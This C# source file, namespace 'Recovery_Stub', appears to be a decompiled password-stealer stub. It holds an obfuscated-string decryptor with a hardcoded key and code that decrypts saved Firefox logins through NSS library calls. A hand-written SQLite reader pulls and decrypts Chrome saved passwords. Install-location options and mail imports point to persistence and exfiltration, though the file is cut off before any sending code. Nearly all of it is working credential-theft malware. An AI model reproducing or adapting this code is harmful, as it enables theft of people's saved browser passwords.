using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Newtonsoft.Json;

namespace Recovery_Stub;

public class Core
{
	public enum INSTALL_StartupPath
	{
		AppData,
		System32,
		ProgramFiles,
		Temp,
		Local,
		MyDocuments
	}

	public class Dec
	{
		public static string DecryptString(string Message)
		{
			UTF8Encoding uTF8Encoding = new UTF8Encoding();
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] key = mD5CryptoServiceProvider.ComputeHash(uTF8Encoding.GetBytes("CqbkTHriRRbQjaArtJfF"));
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Key = key;
			tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
			tripleDESCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			byte[] array = Convert.FromBase64String(Message);
			byte[] bytes;
			try
			{
				ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
				bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
			}
			finally
			{
				tripleDESCryptoServiceProvider.Clear();
				mD5CryptoServiceProvider.Clear();
			}
			return uTF8Encoding.GetString(bytes);
		}
	}

	public static class Firefox
	{
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long NSS_InitPtr(string configdir);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long PK11_GetInternalKeySlotPtr();

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

		private struct TSECItem
		{
			public int SECItemType;

			public int SECItemData;

			public int SECItemLen;
		}

		private class JsonFFData
		{
			[JsonProperty("nextId")]
			public long nextId;

			[JsonProperty("logins")]
			public LoginData[] logins;

			[JsonProperty("disabledHosts")]
			public string[] disabledHosts;

			[JsonProperty("version")]
			public int version;
		}

		private class LoginData
		{
			[JsonProperty("id")]
			public long id;

			[JsonProperty("hostname")]
			public string hostname;

			[JsonProperty("url")]
			public string url;

			[JsonProperty("httprealm")]
			public string httprealm;

			[JsonProperty("formSubmitURL")]
			public string formSubmitURL;

			[JsonProperty("usernameField")]
			public string usernameField;

			[JsonProperty("passwordField")]
			public string passwordField;

			[JsonProperty("encryptedUsername")]
			public string encryptedUsername;

			[JsonProperty("encryptedPassword")]
			public string encryptedPassword;

			[JsonProperty("guid")]
			public string guid;

			[JsonProperty("encType")]
			public int encType;

			[JsonProperty("timeCreated")]
			public long timeCreated;

			[JsonProperty("timeLastUsed")]
			public long timeLastUsed;

			[JsonProperty("timePasswordChanged")]
			public long timePasswordChanged;

			[JsonProperty("timesUsed")]
			public long timesUsed;
		}

		private static IntPtr nssModule;

		private static DirectoryInfo firefoxPath;

		private static DirectoryInfo firefoxProfilePath;

		private static FileInfo firefoxLoginFile;

		private static FileInfo firefoxCookieFile;

		static Firefox()
		{
			try
			{
				firefoxPath = GetFirefoxInstallPath();
				if (firefoxPath != null)
				{
					firefoxProfilePath = GetProfilePath();
				}
				if (firefoxProfilePath != null)
				{
					firefoxLoginFile = GetFile(firefoxProfilePath, Dec.DecryptString("Z4sUqRAPJyOtGSM93BvthQ=="));
				}
			}
			catch
			{
				error = Dec.DecryptString("+rxNIFsFNSEnvWCW4LlFN5hOqQ5T2P+rMMW+H6nosI9h+KqiiaeJw3iVaODlMIJV");
			}
		}

		public static List<FirefoxPassword> Passwords()
		{
			List<FirefoxPassword> list = new List<FirefoxPassword>();
			InitializeDelegates(firefoxProfilePath, firefoxPath);
			JsonFFData jsonFFData = new JsonFFData();
			using (StreamReader streamReader = new StreamReader(firefoxLoginFile.FullName))
			{
				string text = streamReader.ReadToEnd();
				jsonFFData = JsonConvert.DeserializeObject<JsonFFData>(text);
			}
			LoginData[] logins = jsonFFData.logins;
			foreach (LoginData loginData in logins)
			{
				string username = Decrypt(loginData.encryptedUsername);
				string password = Decrypt(loginData.encryptedPassword);
				Uri host = new Uri(loginData.formSubmitURL);
				FirefoxPassword firefoxPassword = new FirefoxPassword();
				firefoxPassword.Host = host;
				firefoxPassword.Username = username;
				firefoxPassword.Password = password;
				list.Add(firefoxPassword);
			}
			return list;
		}

		private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
		{
			LoadLibrary(firefoxPath.FullName + Dec.DecryptString("itSA6VEVLLqNyr9IamjmfA=="));
			LoadLibrary(firefoxPath.FullName + Dec.DecryptString("IDvfiUGD+GiNyr9IamjmfA=="));
			LoadLibrary(firefoxPath.FullName + Dec.DecryptString("lgEwnctCCPyj36dr/KKlaw=="));
			nssModule = LoadLibrary(firefoxPath.FullName + Dec.DecryptString("bZbCJSbfqn6902NDpfb9rw=="));
			IntPtr procAddress = GetProcAddress(nssModule, Dec.DecryptString("0VqdmDT8tpx4lWjg5TCCVQ=="));
			NSS_InitPtr nSS_InitPtr = (NSS_InitPtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(NSS_InitPtr));
			nSS_InitPtr(firefoxProfilePath.FullName);
			long slot = PK11_GetInternalKeySlot();
			PK11_Authenticate(slot, loadCerts: true, 0L);
		}

		private static DateTime FromUnixTime(long unixTime)
		{
			return new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(unixTime);
		}

		private static long ToUnixTime(DateTime value)
		{
			return (long)(value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime()).TotalSeconds;
		}

		private static DirectoryInfo GetProfilePath()
		{
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Dec.DecryptString("JbsTsyZ2oZJVrCEzAlTPPfArKhEPVDkV5sOvLhQ3zaE=");
			if (!Directory.Exists(path))
			{
				throw new Exception("Firefox Application Data folder does not exist!");
			}
			DirectoryInfo directoryInfo = new DirectoryInfo(path);
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			if (directories.Length == 0)
			{
				throw new IndexOutOfRangeException("No Firefox profiles could be found");
			}
			return directories[0];
		}

		private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
		{
			FileInfo[] files = profilePath.GetFiles(searchTerm);
			int num = 0;
			if (0 >= files.Length)
			{
				throw new Exception("No Firefox logins.json was found");
			}
			return files[num];
		}

		private static DirectoryInfo GetFirefoxInstallPath()
		{
			DirectoryInfo result = null;
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Mozilla\\Mozilla Firefox", writable: false);
			RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\Mozilla\\Mozilla Firefox", writable: false);
			if (registryKey != null)
			{
				string[] subKeyNames = registryKey.GetSubKeyNames();
				if (subKeyNames.Length == 0)
				{
					throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
				}
				RegistryKey registryKey3 = registryKey.OpenSubKey(subKeyNames[0]);
				string text = (string)registryKey3.OpenSubKey("Main")!.GetValue("Install Directory", null);
				if (text == null)
				{
					throw new NullReferenceException("Install string was null");
				}
				result = new DirectoryInfo(text);
			}
			else if (registryKey2 != null)
			{
				string[] subKeyNames2 = registryKey.GetSubKeyNames();
				if (subKeyNames2.Length == 0)
				{
					throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
				}
				RegistryKey registryKey4 = registryKey.OpenSubKey(subKeyNames2[0]);
				string text2 = (string)registryKey4.OpenSubKey("Main")!.GetValue("Install Directory", null);
				if (text2 == null)
				{
					throw new NullReferenceException("Install string was null");
				}
				result = new DirectoryInfo(text2);
			}
			return result;
		}

		private static IntPtr LoadWin32Library(string libPath)
		{
			if (string.IsNullOrEmpty(libPath))
			{
				throw new ArgumentNullException("libPath");
			}
			IntPtr intPtr = LoadLibrary(libPath);
			if (intPtr == IntPtr.Zero)
			{
				int lastWin32Error = Marshal.GetLastWin32Error();
				Win32Exception ex = new Win32Exception(lastWin32Error);
				ex.Data.Add("LastWin32Error", lastWin32Error);
				throw new Exception("can't load DLL " + libPath, ex);
			}
			return intPtr;
		}

		[DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
		private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

		[DllImport("kernel32.dll")]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

		private static long PK11_GetInternalKeySlot()
		{
			IntPtr procAddress = GetProcAddress(nssModule, "PK11_GetInternalKeySlot");
			PK11_GetInternalKeySlotPtr pK11_GetInternalKeySlotPtr = (PK11_GetInternalKeySlotPtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(PK11_GetInternalKeySlotPtr));
			return pK11_GetInternalKeySlotPtr();
		}

		private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
		{
			IntPtr procAddress = GetProcAddress(nssModule, "PK11_Authenticate");
			PK11_AuthenticatePtr pK11_AuthenticatePtr = (PK11_AuthenticatePtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(PK11_AuthenticatePtr));
			return pK11_AuthenticatePtr(slot, loadCerts, wincx);
		}

		private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
		{
			IntPtr procAddress = GetProcAddress(nssModule, "NSSBase64_DecodeBuffer");
			NSSBase64_DecodeBufferPtr nSSBase64_DecodeBufferPtr = (NSSBase64_DecodeBufferPtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(NSSBase64_DecodeBufferPtr));
			return nSSBase64_DecodeBufferPtr(arenaOpt, outItemOpt, inStr, inLen);
		}

		private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
		{
			IntPtr procAddress = GetProcAddress(nssModule, "PK11SDR_Decrypt");
			PK11SDR_DecryptPtr pK11SDR_DecryptPtr = (PK11SDR_DecryptPtr)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(PK11SDR_DecryptPtr));
			return pK11SDR_DecryptPtr(ref data, ref result, cx);
		}

		private static string Decrypt(string cypherText)
		{
			StringBuilder stringBuilder = new StringBuilder(cypherText);
			int value = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
			TSECItem result = default(TSECItem);
			TSECItem data = (TSECItem)Marshal.PtrToStructure(new IntPtr(value), typeof(TSECItem));
			if (PK11SDR_Decrypt(ref data, ref result, 0) == 0 && result.SECItemLen != 0)
			{
				byte[] array = new byte[result.SECItemLen];
				Marshal.Copy(new IntPtr(result.SECItemData), array, 0, result.SECItemLen);
				return Encoding.UTF8.GetString(array);
			}
			return null;
		}
	}

	public class FirefoxPassword
	{
		private string _username;

		private string _password;

		private Uri _host;

		public string Username
		{
			get
			{
				return _username;
			}
			set
			{
				_username = value;
			}
		}

		public string Password
		{
			get
			{
				return _password;
			}
			set
			{
				_password = value;
			}
		}

		public Uri Host
		{
			get
			{
				return _host;
			}
			set
			{
				_host = value;
			}
		}

		public override string ToString()
		{
			return string.Format(Dec.DecryptString("NhPgVy2asFA+Pj8OrxgwkiST+2Ryc4EYXLVTa7pz55ZmAQb6k6MWww=="), Username, Password, Host.Host, Environment.NewLine);
		}
	}

	private enum SchemaFormat
	{
		Format1 = 1,
		Format2,
		Format3,
		Format4
	}

	public class SQLiteHandler
	{
		private struct record_header_field
		{
			public long size;

			public long type;
		}

		private struct sqlite_master_entry
		{
			public long row_id;

			public string item_type;

			public string item_name;

			public string astable_name;

			public long root_num;

			public string sql_statement;
		}

		private struct table_entry
		{
			public long row_id;

			public string[] content;
		}

		private byte[] db_bytes;

		private ulong encoding;

		private string[] field_names;

		private sqlite_master_entry[] master_table_entries;

		private ushort page_size;

		private byte[] SQLDataTypeSize = new byte[10] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };

		private table_entry[] table_entries;

		private SchemaFormat format;

		public SQLiteHandler(string baseName)
		{
			if (File.Exists(baseName))
			{
				FileSystem.FileOpen(1, baseName, (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
				string s = Strings.Space((int)FileSystem.LOF(1));
				FileSystem.FileGet(1, ref s, -1L, false);
				FileSystem.FileClose(new int[1] { 1 });
				db_bytes = Encoding.Default.GetBytes(s);
				if (Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
				{
					throw new Exception("Not a valid SQLite 3 Database File");
				}
				if (db_bytes[52] != 0)
				{
					throw new Exception("Auto-vacuum capable database is not supported");
				}
				decimal num = new decimal(ConvertToInteger(44, 4));
				format = (SchemaFormat)(int)num;
				page_size = (ushort)ConvertToInteger(16, 2);
				encoding = ConvertToInteger(56, 4);
				if (decimal.Compare(new decimal(encoding), 0m) == 0)
				{
					encoding = 1uL;
				}
				ReadMasterTable(100uL);
			}
		}

		private ulong ConvertToInteger(int startIndex, int Size)
		{
			if (Size > 8 || Size == 0)
			{
				return 0uL;
			}
			ulong num = 0uL;
			int num2 = Size - 1;
			for (int i = 0; i <= num2; i++)
			{
				num = (num << 8) | db_bytes[startIndex + i];
			}
			return num;
		}

		private long CVL(int startIndex, int endIndex)
		{
			endIndex++;
			byte[] array = new byte[8];
			int num = endIndex - startIndex;
			bool flag = false;
			if (num == 0 || num > 9)
			{
				return 0L;
			}
			switch (num)
			{
			case 1:
				array[0] = (byte)(db_bytes[startIndex] & 0x7Fu);
				return BitConverter.ToInt64(array, 0);
			case 9:
				flag = true;
				break;
			}
			int num2 = 1;
			int num3 = 7;
			int num4 = 0;
			if (flag)
			{
				array[0] = db_bytes[endIndex - 1];
				endIndex--;
				num4 = 1;
			}
			for (int i = endIndex - 1; i >= startIndex; i += -1)
			{
				if (i - 1 >= startIndex)
				{
					array[num4] = (byte)(((byte)(db_bytes[i] >> ((num2 - 1) & 7)) & (255 >> num2)) | (byte)(db_bytes[i - 1] << (num3 & 7)));
					num2++;
					num4++;
					num3--;
				}
				else if (!flag)
				{
					array[num4] = (byte)((byte)(db_bytes[i] >> ((num2 - 1) & 7)) & (255 >> num2));
				}
			}
			return BitConverter.ToInt64(array, 0);
		}

		public int GetRowCount()
		{
			return table_entries.Length;
		}

		public string[] GetTableNames()
		{
			string[] array = null;
			int num = 0;
			int num2 = master_table_entries.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (master_table_entries[i].item_type == "table")
				{
					array = (string[])Utils.CopyArray((Array)array, (Array)new string[num + 1]);
					array[num] = master_table_entries[i].item_name;
					num++;
				}
			}
			return array;
		}

		public string GetValue(int row_num, int field)
		{
			if (row_num >= table_entries.Length)
			{
				return null;
			}
			if (field >= table_entries[row_num].content.Length)
			{
				return null;
			}
			return table_entries[row_num].content[field];
		}

		public string GetValue(int row_num, string field)
		{
			int num = -1;
			int num2 = field_names.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return null;
			}
			return GetValue(row_num, num);
		}

		private int GVL(int startIndex)
		{
			if (startIndex > db_bytes.Length)
			{
				return 0;
			}
			int num = startIndex + 8;
			int num2 = startIndex;
			while (true)
			{
				if (num2 <= num)
				{
					if (num2 <= db_bytes.Length - 1)
					{
						if ((db_bytes[num2] & 0x80) != 128)
						{
							break;
						}
						num2++;
						continue;
					}
					return 0;
				}
				return startIndex + 8;
			}
			return num2;
		}

		private bool IsOdd(long value)
		{
			return (value & 1L) == 1L;
		}

		private void ReadMasterTable(ulong Offset)
		{
			if (db_bytes[(uint)Offset] == 13)
			{
				ushort num = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				int num2 = 0;
				if (master_table_entries != null)
				{
					num2 = master_table_entries.Length;
					master_table_entries = (sqlite_master_entry[])Utils.CopyArray((Array)master_table_entries, (Array)new sqlite_master_entry[master_table_entries.Length + num + 1]);
				}
				else
				{
					master_table_entries = new sqlite_master_entry[num + 1];
				}
				int num3 = num;
				for (int i = 0; i <= num3; i++)
				{
					ulong num4 = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
					if (decimal.Compare(new decimal(Offset), 100m) != 0)
					{
						num4 += Offset;
					}
					int num5 = GVL((int)num4);
					CVL((int)num4, num5);
					int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					master_table_entries[num2 + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = GVL((int)num4);
					num6 = num5;
					long value = CVL((int)num4, num5);
					long[] array = new long[5];
					int num7 = 0;
					do
					{
						num5 = num6 + 1;
						num6 = GVL(num5);
						array[num7] = CVL(num5, num6);
						if (array[num7] <= 9L)
						{
							array[num7] = SQLDataTypeSize[(int)array[num7]];
						}
						else if (IsOdd(array[num7]))
						{
							array[num7] = (long)Math.Round((double)(array[num7] - 13L) / 2.0);
						}
						else
						{
							array[num7] = (long)Math.Round((double)(array[num7] - 12L) / 2.0);
						}
						num7++;
					}
					while (num7 <= 4);
					if (decimal.Compare(new decimal(encoding), 1m) == 0)
					{
						master_table_entries[num2 + i].item_type = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(encoding), 2m) == 0)
					{
						master_table_entries[num2 + i].item_type = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					else if (decimal.Compare(new decimal(encoding), 3m) == 0)
					{
						master_table_entries[num2 + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num4), new decimal(value))), (int)array[0]);
					}
					if (decimal.Compare(new decimal(encoding), 1m) == 0)
					{
						master_table_entries[num2 + i].item_name = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(encoding), 2m) == 0)
					{
						master_table_entries[num2 + i].item_name = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					else if (decimal.Compare(new decimal(encoding), 3m) == 0)
					{
						master_table_entries[num2 + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0]))), (int)array[1]);
					}
					master_table_entries[num2 + i].root_num = (long)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2]))), (int)array[3]);
					if (decimal.Compare(new decimal(encoding), 1m) == 0)
					{
						master_table_entries[num2 + i].sql_statement = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(encoding), 2m) == 0)
					{
						master_table_entries[num2 + i].sql_statement = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
					else if (decimal.Compare(new decimal(encoding), 3m) == 0)
					{
						master_table_entries[num2 + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num4), new decimal(value)), new decimal(array[0])), new decimal(array[1])), new decimal(array[2])), new decimal(array[3]))), (int)array[4]);
					}
				}
			}
			else
			{
				if (db_bytes[(uint)Offset] != 5)
				{
					return;
				}
				int num8 = Convert.ToInt32(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				int num9 = num8;
				for (int j = 0; j <= num9; j++)
				{
					ushort num10 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(j * 2))), 2);
					if (decimal.Compare(new decimal(Offset), 100m) == 0)
					{
						ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(num10, 4)), 1m), new decimal(page_size))));
					}
					else
					{
						ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num10), 4)), 1m), new decimal(page_size))));
					}
				}
				ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal(page_size))));
			}
		}

		public bool ReadTable(string TableName)
		{
			int num = -1;
			int num2 = master_table_entries.Length - 1;
			for (int i = 0; i <= num2; i++)
			{
				if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
				{
					num = i;
					break;
				}
			}
			if (num == -1)
			{
				return false;
			}
			string[] array = master_table_entries[num].sql_statement.Substring(master_table_entries[num].sql_statement.IndexOf("(") + 1).Split(new char[1] { ',' });
			int num3 = array.Length - 1;
			for (int j = 0; j <= num3; j++)
			{
				array[j] = array[j].TrimStart(new char[0]);
				int num4 = array[j].IndexOf(" ");
				if (num4 > 0)
				{
					array[j] = array[j].Substring(0, num4);
				}
				if (array[j].IndexOf("UNIQUE") == 0)
				{
					break;
				}
				field_names = (string[])Utils.CopyArray((Array)field_names, (Array)new string[j + 1]);
				field_names[j] = array[j];
			}
			return ReadTableFromOffset((ulong)((master_table_entries[num].root_num - 1L) * page_size));
		}

		private bool ReadTableFromOffset(ulong Offset)
		{
			if (db_bytes[(uint)Offset] == 13)
			{
				int num = Convert.ToInt32(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				int num2 = 0;
				if (table_entries != null)
				{
					num2 = table_entries.Length;
					table_entries = (table_entry[])Utils.CopyArray((Array)table_entries, (Array)new table_entry[table_entries.Length + num + 1]);
				}
				else
				{
					table_entries = new table_entry[num + 1];
				}
				int num3 = num;
				for (int i = 0; i <= num3; i++)
				{
					record_header_field[] array = null;
					ulong num4 = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8m), new decimal(i * 2))), 2);
					if (decimal.Compare(new decimal(Offset), 100m) != 0)
					{
						num4 += Offset;
					}
					int num5 = GVL((int)num4);
					CVL((int)num4, num5);
					int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)));
					table_entries[num2 + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num5), new decimal(num4))), 1m)), num6);
					num4 = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num4), decimal.Subtract(new decimal(num6), new decimal(num4))), 1m));
					num5 = GVL((int)num4);
					num6 = num5;
					long num7 = CVL((int)num4, num5);
					long num8 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num4), new decimal(num5)), 1m));
					int num9 = 0;
					while (num8 < num7)
					{
						array = (record_header_field[])Utils.CopyArray((Array)array, (Array)new record_header_field[num9 + 1]);
						num5 = num6 + 1;
						num6 = GVL(num5);
						array[num9].type = CVL(num5, num6);
						if (array[num9].type > 9L)
						{
							if (IsOdd(array[num9].type))
							{
								array[num9].size = (long)Math.Round((double)(array[num9].type - 13L) / 2.0);
							}
							else
							{
								array[num9].size = (long)Math.Round((double)(array[num9].type - 12L) / 2.0);
							}
						}
						else
						{
							array[num9].size = SQLDataTypeSize[(int)array[num9].type];
						}
						num8 = num8 + (num6 - num5) + 1L;
						num9++;
					}
					table_entries[num2 + i].content = new string[array.Length - 1 + 1];
					int num10 = 0;
					int num11 = array.Length - 1;
					for (int j = 0; j <= num11; j++)
					{
						if (array[j].type > 9L)
						{
							if (!IsOdd(array[j].type))
							{
								if (decimal.Compare(new decimal(encoding), 1m) == 0)
								{
									table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
								}
								else if (decimal.Compare(new decimal(encoding), 2m) == 0)
								{
									table_entries[num2 + i].content[j] = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
								}
								else if (decimal.Compare(new decimal(encoding), 3m) == 0)
								{
									table_entries[num2 + i].content[j] = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
								}
							}
							else
							{
								table_entries[num2 + i].content[j] = Encoding.Default.GetString(db_bytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size);
							}
						}
						else
						{
							table_entries[num2 + i].content[j] = Conversions.ToString(ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num4), new decimal(num7)), new decimal(num10))), (int)array[j].size));
						}
						num10 += (int)array[j].size;
					}
				}
			}
			else if (db_bytes[(uint)Offset] == 5)
			{
				ushort num12 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3m)), 2)), 1m));
				int num13 = num12;
				for (int k = 0; k <= num13; k++)
				{
					ushort num14 = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12m), new decimal(k * 2))), 2);
					ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + num14), 4)), 1m), new decimal(page_size))));
				}
				ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8m)), 4)), 1m), new decimal(page_size))));
			}
			return true;
		}
	}

	public class GoogleChrome
	{
		[Flags]
		private enum CryptProtectPromptFlags
		{
			CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
			CRYPTPROTECT_PROMPT_ON_PROTECT = 2
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CRYPTPROTECT_PROMPTSTRUCT
		{
			public int cbSize;

			public CryptProtectPromptFlags dwPromptFlags;

			public IntPtr hwndApp;

			public string szPrompt;
		}

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DATA_BLOB
		{
			public int cbData;

			public IntPtr pbData;
		}

		public static string Recover()
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Dec.DecryptString("PNr5viIUcQGh4pYRAGlGoLo0xUJYxeDm4ZJ88saye4Bj41vNXx2eDgimpi4l1z2W");
			string empty = string.Empty;
			string text2 = string.Empty;
			try
			{
				SQLiteHandler sQLiteHandler = new SQLiteHandler(text);
				sQLiteHandler.ReadTable(Dec.DecryptString("FDcyctDUSCY="));
				if (File.Exists(text))
				{
					for (int i = 0; i <= sQLiteHandler.GetRowCount() - 1; i++)
					{
						try
						{
							string value = sQLiteHandler.GetValue(i, Dec.DecryptString("4R94h4ewII2tsIyT54noig=="));
							string value2 = sQLiteHandler.GetValue(i, Dec.DecryptString("B2qu1psNci8z4lcAIl3rPg=="));
							string text3 = Decrypt(Encoding.Default.GetBytes(sQLiteHandler.GetValue(i, Dec.DecryptString("/cKKLmWNFYAz4lcAIl3rPg=="))));
							if (value2 != "" && text3 != "" && text3 != "FAIL" && (value.Contains(empty) || empty == Dec.DecryptString("vGxkvdH3AG0=")))
							{
								string text4 = text2;
								text2 = text4 + "\r\nHost: " + value + Environment.NewLine + Dec.DecryptString("KV4h6OY1GKU87vTveTwbYw==") + value2 + Environment.NewLine + Dec.DecryptString("m5ruKX/NKMU87vTveTwbYw==") + text3 + Environment.NewLine;
							}
						}
						catch
						{
						}
					}
					return text2;
				}
				return text2;
			}
			catch
			{
				return text2;
			}
		}

		public static string QueryChrome(string searchTerm)
		{
			if (string.IsNullOrEmpty(searchTerm))
			{
				searchTerm = "**ALL**";
			}
